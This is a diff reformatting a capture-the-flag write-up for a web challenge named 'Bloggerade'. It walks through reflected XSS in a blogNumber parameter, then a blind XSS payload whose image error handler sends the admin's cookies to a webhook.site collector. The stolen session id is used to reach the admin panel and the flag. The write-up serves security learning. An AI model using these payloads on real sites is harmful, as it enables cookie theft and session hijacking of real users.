@@ -1,39 +1,40 @@
-Challenge: Bloggerade
-Points: 200
-Category: Web
+# Bloggerade Challenge
 
-![Alt text](screenshots/bloggerade1.png)
+**Points:** 200  
+**Category:** Web  
 
-![Alt text](screenshots/bloggerade2.png)
+![Initial State](screenshots/bloggerade1.png)
 
-This application allows us to enter an input, which is then reviewed by the admin. These kind of situations generally have chances of Blind XSS which can be used to steal Session Cookies.
+This application allows users to enter input, which is then reviewed by the admin. Situations like these often present opportunities for Blind XSS attacks to steal Session Cookies.
 
-First, let's check the possibility of XSS. We can see that the existing blogs have a Blog Number, which is being reflected on the page. So let's try to reflect out Session ID there using "%3Cscript%3Edocument.write(document.cookie);%3C/script%3E" as input to the blogNumber parameter.
+## Steps to Exploit
 
-![Alt text](screenshots/bloggerade3.png)
+1. **Testing for XSS:**  
+   Check for XSS by observing that the blogs have a Blog Number, reflected on the page. Try reflecting the Session ID in the `blogNumber` parameter using the input:  
+   `%3Cscript%3Edocument.write(document.cookie);%3C/script%3E`  
+   ![Blog Number XSS Test](screenshots/bloggerade2.png)
+   ![Blog Number XSS Reflection](screenshots/bloggerade3.png)
 
-Now, it's time for Blind XSS. We will setup a a platform to catch our requests/responses at https://webhook.site.
-Payload: 2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E
-Parameter: blogNumber
+2. **Executing Blind XSS:**  
+   Set up a platform to catch requests/responses at [https://webhook.site](https://webhook.site).  
+   **Payload:** `2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E`  
+   **Parameter:** `blogNumber`  
+   After executing, the cookies are captured.  
+   ![Captured Cookies](screenshots/bloggerade4.png)
 
-We get our cookies.
+3. **Using URL as Payload:**  
+   Change the input type of `url` from URL to text to enter the payload.  
+   **Payload:** `http://18.225.156.202:9090/blog?blogNumber=2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E`  
+   **Parameter:** `url`  
+   ![URL Payload Entry](screenshots/bloggerade5.png)
+   ![URL Payload Result](screenshots/bloggerade6.png)  
+   The session id `admincokie123thiswillallowyoutogototheadminpanel` is obtained.  
 
-![Alt text](screenshots/bloggerade4.png)
+4. **Accessing Admin Panel:**  
+   Use the captured session id in place of your own to access the admin's session. Then click on "Admin Panel".  
+   ![Access Admin Panel](screenshots/bloggerade7.png)  
+   ![Admin Panel Accessed](screenshots/bloggerade8.png)
 
-Now, let's use the whole URL as a payload.
-Payload: http://18.225.156.202:9090/blog?blogNumber=2%22%3E%3Cimg%20src=x%20onerror=this.src=%27https://webhook.site/481ad6c7-c027-4329-9062-0225dc0e8044/?%27%2bdocument.cookie;%3E
-Parameter: url
-Preparation: Change the input type of url from url to text so that we can enter our payload.
+## Flag
 
-![Alt text](screenshots/bloggerade5.png)
-
-Result: 
-![Alt text](screenshots/bloggerade6.png)
-
-We got the session id: admincokie123thiswillallowyoutogototheadminpanel. Now we will use this in place of our session  id to get access to the admin's session and then we click "Admin Panel".
-
-![Alt text](screenshots/bloggerade7.png)
-
-![Alt text](screenshots/bloggerade8.png)
-
-FLAG: Amazon{XSS_b0t_G0t_Pwn3d}
+`Amazon{XSS_b0t_G0t_Pwn3d}`
